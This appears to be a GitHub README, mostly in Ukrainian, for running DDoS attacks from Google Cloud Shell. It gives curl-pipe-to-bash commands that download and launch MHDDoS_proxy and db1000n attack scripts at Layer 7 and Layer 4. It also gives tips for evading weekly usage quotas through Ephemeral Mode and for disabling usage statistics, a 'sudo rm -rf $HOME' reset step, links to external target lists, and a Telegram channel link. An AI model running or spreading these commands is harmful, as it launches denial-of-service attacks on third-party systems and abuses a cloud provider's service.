## DDoS whith Google Cloud Shell
#### Scripts for durable cloudshell session. Test!
#
### Використовуємо https://shell.cloud.google.com/?fromcloudshell=true&show=terminal
#
### Команди для встановлення та запуску MHDDoS_proxy
**Layer7:**
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
```
**Layer4:**    
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L4.sh | bash
```
**All list (*--itarmy*):**    
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/itarmy.sh | bash
```
~~**Подвійна атака (Layer7+Layer4) розділений термінал (tmux):**~~    
`curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_dualShell.sh | bash`    
.    
:white_check_mark: *Автоперезапуск скриптів, метод атаки додається зі списку цілей, параметр -t за замовчуванням 1000.    
За потреби параметр -t можна змінити додавши до команди ` -s -- "кількість"`, напр. `-s -- 2000`*    
#
### Команда для встановлення та запуску db1000n
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/db1000n_GShell.sh | bash
``` 
#
:exclamation:• У [Google Cloud Shell](https://shell.cloud.google.com/?fromcloudshell=true&show=terminal) в налаштуваннях бажано **вимкнути статистику використання**.    
:exclamation:• Дозволяється запускати до 4 терміналів на 1 акаунт але **рекомендується використовувати 1 термінал на акаунт**.    
:exclamation:• Враховуйте, що встановлені тижневі квоти на використання, 1 акаунт - 50 годин у звичайному режимі та 50 годин у ефемерному режимі (*до закінчення квоти у звичайному режимі - вмикаємо Ephemeral Mode (ставимо - "Завжди") та отримуємо ще 50 годин використання на поточний тиждень*)    
• **Для скидання Cloud Shell** - Видаліть усі файли з домашнього каталогу, команда: `sudo rm -rf $HOME`, далі - у меню Cloud Shell клацніть значок меню з трьома крапками, а потім натисніть "Restart" *(Буде надано нову віртуальну машину, а домашній каталог буде відновлено до стану за замовчуванням)*
#
#
#### Списки з цілями
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst    
https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4t.lst
#
#
[IT ARMY of Ukraine](https://t.me/itarmyofukraine2022)
